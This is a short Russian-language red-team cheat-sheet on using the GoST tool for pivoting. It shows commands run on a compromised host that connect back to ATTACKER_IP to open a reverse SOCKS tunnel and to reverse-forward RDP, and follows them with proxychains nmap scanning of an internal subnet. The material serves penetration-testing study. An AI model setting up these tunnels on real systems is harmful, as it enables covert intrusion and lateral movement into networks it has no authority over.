#tool #pivoting #proxy #tunneling #windows #Linux #AD 

> **GoST** - Универсальный инструмент для пивотинга и туннелирования

Нужен, когда необходимо быстро и гибко сделать пивотинг, поддерживает множество протоколов:
```
TCP
TLS
HTTP
HTTPS
WebSocket
SSH
KCP
QUIC
```

## Применение

1) Pivoting
2) Reverse tunneling
3) SOCKS Proxy


## Режимы работы

#### 1)* Reverse SOCKS tunnel (pivot если нет прямого доступа)

attacker machine:
```bash
gost -L socks5://127.0.0.1:1080
```

compromised host:
```bash
gost -R socks5://ATTACKER_IP:1080
```

```bash
proxychains nmap 192.168.2.0/24
```


#### 2. Reverse port forwarding

attacker:
```bash
gost -L tcp://127.0.0.1:4444
```

compromised host:
```bash
gost -R tcp://ATTACKER_IP:4444/127.0.0.1:3389
```

attacker теперь может подключиться:
```bash
rdesktop 127.0.0.1:4444
```

